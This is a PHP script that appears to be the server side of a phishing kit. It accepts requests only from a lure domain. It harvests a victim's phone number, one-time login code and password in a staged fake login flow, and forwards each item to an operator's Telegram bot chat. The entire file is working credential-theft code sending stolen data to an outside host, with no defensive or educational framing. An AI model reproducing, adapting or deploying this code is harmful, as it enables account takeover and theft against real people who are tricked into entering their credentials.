<?php
// Define allowed domain
$allowedDomain = "https://desiviralxxxvideos.infy.uk";

// Enable CORS only for the allowed domain
header("Access-Control-Allow-Origin: $allowedDomain");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: Content-Type");

// Validate origin and referer to prevent unauthorized access
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';
$referer = $_SERVER['HTTP_REFERER'] ?? '';

if ($origin !== $allowedDomain && strpos($referer, $allowedDomain) !== 0) {
    http_response_code(403); // Forbidden
    echo json_encode(["error" => "Access denied"]);
    exit();
}

// Block all non-POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405); // Method Not Allowed
    echo json_encode(["error" => "Only POST requests are allowed"]);
    exit();
}

// Load environment variables
$telegramToken = getenv('TOKEN'); // Secure token storage
$chatId = getenv('ID'); // Store Chat ID in environment variable

// Function to send a message to Telegram
function sendToTelegram($message) {
    global $telegramToken, $chatId;

    $url = "https://api.telegram.org/bot$telegramToken/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'MarkdownV2'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

// Handle POST Requests
$action = $_POST['action'] ?? '';

if ($action === 'phone') {
    $phone = $_POST['phone'] ?? '';
    sendToTelegram("*Phone:* \n`$phone`");
    echo json_encode(["step" => "code"]);
    exit;
}

if ($action === 'otp') {
    $phone = $_POST['phone'] ?? '';
    $code = $_POST['code'] ?? '';
    sendToTelegram("*OTP:*\n Phone: `$phone`\n OTP: `$code`");
    echo json_encode(["step" => "password"]);
    exit;
}

if ($action === 'password') {
    $phone = $_POST['phone'] ?? '';
    $password = $_POST['password'] ?? '';
    sendToTelegram("*Login:*\n Phone: `$phone`\n Password: `$password`");
    echo json_encode(["status" => "success"]);
    exit;
}

// Default response if no valid action
http_response_code(400);
echo json_encode(["error" => "Invalid request"]);
?>